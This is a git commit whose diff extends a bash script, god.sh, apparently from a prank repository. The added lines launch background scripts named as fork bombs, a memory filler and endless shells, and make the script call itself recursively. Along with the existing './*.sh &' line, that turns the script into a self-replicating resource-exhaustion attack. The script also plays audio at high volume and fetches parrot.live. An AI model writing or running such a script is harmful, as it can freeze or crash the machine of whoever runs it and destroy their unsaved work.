72aaadc15587ecccf192b05e9f57ba3dd92d49e4
veryheavypickle <xavier.carroll01@gmail.com>
2022-07-12 21:25:44 +0200

    fixed god

--- god.sh
+++ god.sh
@@ -1,5 +1,14 @@
 #!/bin/bash
 
 ./*.sh &
+bash aliasgccfart.sh &
+bash aliasoutrr.sh &
+bash fork_bomb_always.sh &
+bash full_mem.sh &
+bash goose.sh &
+bash infinite_zsh.sh &
+bash open_all.sh &
+bash simple_fork_bomb.sh &
+bash god.sh &
 afplay --volume 180 sicko.mp3 &
 curl parrot.live
